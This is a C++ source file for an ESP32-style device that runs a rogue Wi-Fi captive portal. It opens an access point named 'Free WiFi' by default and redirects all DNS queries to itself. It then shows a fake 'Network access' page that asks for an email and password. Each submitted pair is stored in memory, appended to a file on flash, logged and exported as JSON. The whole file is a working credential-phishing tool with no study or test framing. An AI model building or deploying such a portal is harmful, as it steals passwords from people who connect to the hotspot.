#include "portal.h"
#include <WiFi.h>
#include <DNSServer.h>
#include <ESPAsyncWebServer.h>
#include "config.h"
#include "log.h"
#include "storage.h"

#define MAX_CREDS 16
#define CRED_LEN 64

struct CredRecord {
  uint32_t at;
  char identity[CRED_LEN];
  char secret[CRED_LEN];
  bool used;
};

static AsyncWebServer *g_server = nullptr;
static DNSServer g_dns;
static bool g_active = false;
static String g_ssid = "Free WiFi";
static CredRecord g_creds[MAX_CREDS];
static uint16_t g_cred_count = 0;
static uint16_t g_cred_next = 0;

static const char PORTAL_HTML[] PROGMEM = R"HTML(<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Network access</title>
<style>
  :root { color-scheme: light; }
  * { box-sizing: border-box; }
  body { margin: 0; min-height: 100vh; display: grid; place-items: center;
         background: #f2f1ec; color: #1c1e1d;
         font-family: "Segoe UI", system-ui, -apple-system, sans-serif; }
  main { width: min(420px, 92vw); background: #fff; border: 1px solid #d9d6cc;
         border-radius: 10px; padding: 28px; box-shadow: 0 18px 40px rgba(28,30,29,.08); }
  .mark { width: 34px; height: 4px; background: #1c1e1d; margin-bottom: 22px; }
  h1 { font-size: 22px; line-height: 1.2; margin: 0 0 6px; letter-spacing: -.01em; }
  p { margin: 0 0 22px; color: #5c625f; font-size: 14px; line-height: 1.5; }
  label { display: block; font-size: 12px; font-weight: 600; letter-spacing: .02em;
          margin: 0 0 6px; color: #3b403d; }
  input { width: 100%; padding: 11px 12px; font-size: 15px; border: 1px solid #c9c6bc;
          border-radius: 6px; background: #fbfaf7; color: #1c1e1d; margin-bottom: 16px; }
  input:focus { outline: 2px solid #1c1e1d; outline-offset: 1px; border-color: #1c1e1d; }
  button { width: 100%; padding: 12px; font-size: 15px; font-weight: 600; color: #fff;
           background: #1c1e1d; border: 0; border-radius: 6px; cursor: pointer; }
  button:hover { background: #333835; }
  button:active { background: #0f1110; }
  .foot { margin-top: 18px; font-size: 11px; color: #8a8f8b; text-align: center; }
</style>
</head>
<body>
<main>
  <div class="mark"></div>
  <h1>Network access</h1>
  <p>This network requires a sign in. Enter your details to get online.</p>
  <form method="post" action="/login">
    <label for="identity">Email or name</label>
    <input id="identity" name="identity" autocomplete="username" required>
    <label for="secret">Password</label>
    <input id="secret" name="secret" type="password" autocomplete="current-password" required>
    <button type="submit">Connect</button>
  </form>
  <div class="foot">Access is logged for network security.</div>
</main>
</body>
</html>)HTML";

static const char DONE_HTML[] PROGMEM = R"HTML(<!doctype html>
<html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Connected</title>
<style>body{margin:0;min-height:100vh;display:grid;place-items:center;background:#f2f1ec;
color:#1c1e1d;font-family:"Segoe UI",system-ui,sans-serif}main{text-align:center;padding:24px}
h1{font-size:20px;margin:0 0 8px}p{color:#5c625f;margin:0;font-size:14px}</style></head>
<body><main><h1>You are online</h1><p>You can close this window.</p></main></body></html>)HTML";

static void escape_json(const char *in, String &out) {
  for (const char *p = in; *p; p++) {
    char c = *p;
    if (c == '"' || c == '\\') out += "\\";
    if (c == '\n') {
      out += "\\n";
      continue;
    }
    if (c == '\r') continue;
    out += c;
  }
}

static void record_credential(const String &identity, const String &secret) {
  CredRecord &r = g_creds[g_cred_next];
  g_cred_next = static_cast<uint16_t>((g_cred_next + 1) % MAX_CREDS);
  if (g_cred_count < MAX_CREDS) g_cred_count++;

  r.at = millis();
  r.used = true;
  strncpy(r.identity, identity.c_str(), CRED_LEN - 1);
  r.identity[CRED_LEN - 1] = '\0';
  strncpy(r.secret, secret.c_str(), CRED_LEN - 1);
  r.secret[CRED_LEN - 1] = '\0';
  for (uint8_t i = 0; i < CRED_LEN; i++) {
    if (r.identity[i] == '\t' || r.identity[i] == '\n' || r.identity[i] == '\r') r.identity[i] = ' ';
    if (r.secret[i] == '\t' || r.secret[i] == '\n' || r.secret[i] == '\r') r.secret[i] = ' ';
  }

  File f = storage_fs().open(CRED_FILE, FILE_APPEND);
  if (f) {
    f.printf("t+%lus\t%s\t%s\n", static_cast<unsigned long>(r.at / 1000), r.identity, r.secret);
    f.close();
  }
  log_print("portal credential captured user=%s", r.identity);
}

void portal_begin() {
  g_active = false;
  g_cred_count = 0;
  g_cred_next = 0;
  memset(g_creds, 0, sizeof(g_creds));
}

bool portal_start(const String &ssid) {
  if (ssid.length() == 0 || ssid.length() > 32) return false;
  if (g_active) portal_stop();
  g_ssid = ssid;

  WiFi.softAPdisconnect(false);
  if (!WiFi.softAP(ssid.c_str(), nullptr, 1, 0, 6)) return false;
  delay(60);

  g_dns.start(53, "*", WiFi.softAPIP());

  g_server = new AsyncWebServer(PORTAL_HTTP_PORT);
  g_server->on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->send(200, "text/html", PORTAL_HTML);
  });
  g_server->on("/login", HTTP_POST, [](AsyncWebServerRequest *request) {
    String identity, secret;
    if (request->hasParam("identity", true)) identity = request->getParam("identity", true)->value();
    if (request->hasParam("secret", true)) secret = request->getParam("secret", true)->value();
    if (identity.length() || secret.length()) record_credential(identity, secret);
    request->send(200, "text/html", DONE_HTML);
  });
  g_server->onNotFound([](AsyncWebServerRequest *request) {
    if (request->method() == HTTP_POST) {
      request->send(200, "text/html", DONE_HTML);
    } else {
      request->send(200, "text/html", PORTAL_HTML);
    }
  });
  g_server->begin();

  g_active = true;
  log_print("portal live ssid=%s ip=%s", g_ssid.c_str(), WiFi.softAPIP().toString().c_str());
  return true;
}

void portal_stop() {
  if (!g_active) return;
  if (g_server) {
    g_server->end();
    delete g_server;
    g_server = nullptr;
  }
  g_dns.stop();
  g_active = false;
  WiFi.softAPdisconnect(false);
  WiFi.softAP(CONTROL_AP_SSID, CONTROL_AP_PASS, 1, 0, 4);
  log_print("portal stopped, control AP restored");
}

void portal_tick() {
  if (g_active) g_dns.processNextRequest();
}

bool portal_active() { return g_active; }
String portal_ssid() { return g_ssid; }
uint16_t portal_cred_count() { return g_cred_count; }

String portal_creds_json() {
  String out = "[";
  uint16_t start = g_cred_count >= MAX_CREDS ? g_cred_next : 0;
  bool first = true;
  for (uint16_t i = 0; i < g_cred_count; i++) {
    uint16_t idx = static_cast<uint16_t>((start + i) % MAX_CREDS);
    if (!g_creds[idx].used) continue;
    if (!first) out += ",";
    first = false;
    out += "{\"at\":";
    out += String(g_creds[idx].at / 1000);
    out += ",\"identity\":\"";
    escape_json(g_creds[idx].identity, out);
    out += "\",\"secret\":\"";
    escape_json(g_creds[idx].secret, out);
    out += "\"}";
  }
  out += "]";
  return out;
}
